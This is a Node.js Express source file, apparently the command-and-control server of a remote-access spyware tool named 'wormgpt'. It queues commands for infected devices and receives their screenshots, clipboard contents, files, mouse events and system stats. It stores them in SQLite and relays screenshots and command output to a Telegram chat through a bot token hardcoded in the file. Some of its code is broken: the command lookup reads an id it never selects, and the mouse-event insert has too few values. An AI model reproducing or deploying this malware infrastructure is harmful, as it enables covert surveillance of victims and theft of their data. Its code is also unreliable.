const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = 8080;
const DB_FILE = 'wormgpt_data.db';
const TELEGRAM_TOKEN = '9165602208:AAHhpX7c7nuVDN2J4N-u0sioRCaE4BuyuRw';

app.use(express.json());
app.use(cors());

// Database
const db = new sqlite3.Database(DB_FILE, (err) => {
 if (err) console.error('DB Error:', err.message);
 else console.log('Connected to SQLite DB.');
});

// Init Tables
db.run(`CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, type TEXT, payload TEXT, log_time TEXT)`);
db.run(`CREATE TABLE IF NOT EXISTS screenshot (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, image_data TEXT, created_at TEXT)`);
db.run(`CREATE TABLE IF NOT EXISTS clipboard (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, content TEXT, created_at TEXT)`);
db.run(`CREATE TABLE IF NOT EXISTS system_stats (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, cpu TEXT, ram TEXT, created_at TEXT)`);
db.run(`CREATE TABLE IF NOT EXISTS files (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, file_path TEXT, file_data TEXT, created_at TEXT)`);
db.run(`CREATE TABLE IF NOT EXISTS mouse_events (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, action TEXT, x TEXT, y TEXT, created_at TEXT)`);
db.run(`CREATE TABLE IF NOT EXISTS commands_queue (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, status TEXT)`);

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// ==========================================
// TELEGRAM HANDLERS
// ==========================================

// 1. Command: /logs
bot.onText(/\/logs/, (msg) => {
 const chatId = msg.chat.id;
 db.all(`SELECT * FROM logs ORDER BY id DESC LIMIT 10`, [], (err, rows) => {
 if (err) return bot.sendMessage(chatId, "Error fetching logs.");
 if (rows.length === 0) return bot.sendMessage(chatId, "No logs found.");
 let text = "Recent Logs:\n";
 rows.forEach(row => text += `[${row.type}] ${row.payload}\n`);
 bot.sendMessage(chatId, text);
 });
});

// 2. Command: /screenshot
bot.onText(/\/screenshot/, (msg) => {
 const chatId = msg.chat.id;
 const deviceId = "BOT_USER";
 bot.sendMessage(chatId, "Taking screenshot...");
 // Trigger client via queue
 db.run(`INSERT INTO commands_queue (device_id, command, status) VALUES (?, ?, ?)`, [deviceId, 'screenshot', 'pending']);
});

// 3. Command: /sys
bot.onText(/\/sys/, (msg) => {
 const chatId = msg.chat.id;
 const deviceId = "BOT_USER";
 db.run(`INSERT INTO commands_queue (device_id, command, status) VALUES (?, ?, ?)`, [deviceId, 'sys_stats', 'pending']);
});

// ==========================================
// API ENDPOINTS (C2 CORE)
// ==========================================

// 1. Endpoint: Hapus perintah yang sudah dibaca (FIFO)
app.post('/api/cmd/read', (req, res) => {
 const { device_id } = req.body;
 
 db.run(`DELETE FROM commands_queue WHERE device_id = ? AND status = 'pending'`, [device_id], (err) => {
 if (err) return res.json({ commands: [] });
 res.json({ commands: [] }); // Simplified
 });
});

// 2. Endpoint: Simpan data (Upload)
app.post('/api/upload', (req, res) => {
 const { device_id, type, payload } = req.body;
 const time = new Date().toISOString();
 
 console.log(`[${time}] RX: ${device_id} - ${type}`);

 // Log ke DB
 db.run(`INSERT INTO logs (device_id, type, payload, log_time) VALUES (?, ?, ?, ?)`, [device_id, type, payload, time]);

 // Notifikasi Telegram
 if (type === 'screenshot') {
 db.run(`INSERT INTO screenshot (device_id, image_data, created_at) VALUES (?, ?, ?)`, [device_id, payload, time]);
 bot.sendPhoto(-1001234567890, payload);
 } else if (type === 'cmd') {
 bot.sendMessage(-1001234567890, `[${device_id}] ${type}: ${payload}`);
 } else if (type === 'sys_stats') {
 db.run(`INSERT INTO system_stats (device_id, cpu, ram, created_at) VALUES (?, ?, ?)`, [device_id, payload, time]);
 } else if (type === 'mouse') {
 db.run(`INSERT INTO mouse_events (device_id, action, x, y, created_at) VALUES (?, ?, ?, ?, ?)`, [device_id, payload, time]);
 }

 res.json({ status: 'success' });
});

// 3. Endpoint: Ambil Perintah (Client Request)
app.get('/api/cmd/:deviceId', (req, res) => {
 const deviceId = req.params.deviceId;
 
 // Cek queue database
 db.get(`SELECT command FROM commands_queue WHERE device_id = ? AND status = 'pending' LIMIT 1`, [deviceId], (err, row) => {
 if (err) return res.json({ command: "ping -n 4 8.8.8.8", status: 'active' });
 
 if (row) {
 // Hapus perintah dari queue setelah diambil
 db.run(`UPDATE commands_queue SET status = 'executed' WHERE id = ?`, [row.id]);
 res.json({ command: row.command, status: 'active' });
 } else {
 res.json({ command: "ping -n 4 8.8.8.8", status: 'active' });
 }
 });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
